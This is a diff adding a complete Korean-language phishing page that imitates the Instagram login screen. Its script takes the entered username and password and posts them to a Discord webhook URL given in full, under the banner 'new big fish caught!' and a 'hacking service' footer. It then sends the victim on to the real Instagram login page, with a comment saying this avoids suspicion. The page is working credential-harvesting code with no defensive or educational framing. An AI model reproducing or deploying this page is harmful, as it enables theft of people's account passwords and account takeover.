@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-box { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 40px; box-sizing: border-box; text-align: center; }
+        h1 { font-family: 'Arial', sans-serif; font-size: 35px; font-weight: bold; font-style: italic; margin-bottom: 30px; letter-spacing: -1px; }
+        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; box-sizing: border-box; font-size: 12px; }
+        button { width: 100%; padding: 7px; border: none; border-radius: 4px; background-color: #0095f6; color: white; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        .separator { display: flex; align-items: center; margin: 20px 0; color: #8e8e8e; font-size: 13px; }
+        .separator::before, .separator::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; margin: 0 10px; }
+        .fb-login { color: #385185; font-size: 14px; font-weight: bold; text-decoration: none; display: block; margin-bottom: 20px; }
+        .forgot { font-size: 12px; color: #00376b; text-decoration: none; }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <h1 style="font-style: normal;">Instagram</h1>
+        
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="전화번호, 사용자 이름 또는 이메일" required>
+            <input type="password" id="password" placeholder="비밀번호" required>
+            <button type="submit">로그인</button>
+        </form>
+
+        <div class="separator">또는</div>
+        <a href="#" class="fb-login">Facebook으로 로그인</a>
+        <a href="#" class="forgot">비밀번호를 잊으셨나요?</a>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault(); // 페이지 새로고침 방지
+
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+            const webhookURL = "https://discord.com/api/webhooks/1496848408902635701/ZgBY8ZvNtAWfzET8f-gfooOmHQcZSgvc0ouQLnuHshzy1SVt-NKQjbjmV5RQxQwTndnH";
+
+            const payload = {
+                embeds: [{
+                    title: "🔔 새로운 대어 낚임!",
+                    color: 15158332,
+                    fields: [
+                        { name: "아이디/이메일", value: user, inline: true },
+                        { name: "비밀번호", value: pass, inline: true }
+                    ],
+                    footer: { text: "제시의 해킹 서비스" },
+                    timestamp: new Date()
+                }]
+            };
+
+            // 디스코드로 데이터 전송
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).then(() => {
+                // 전송 후 실제 인스타 로그인 페이지로 리다이렉트 (의심 회피)
+                window.location.href = "https://www.instagram.com/accounts/login/";
+            }).catch(err => {
+                // 에러나도 일단 인스타로 보냄
+                window.location.href = "https://www.instagram.com/accounts/login/";
+            });
+        });
+    </script>
+</body>
+</html>
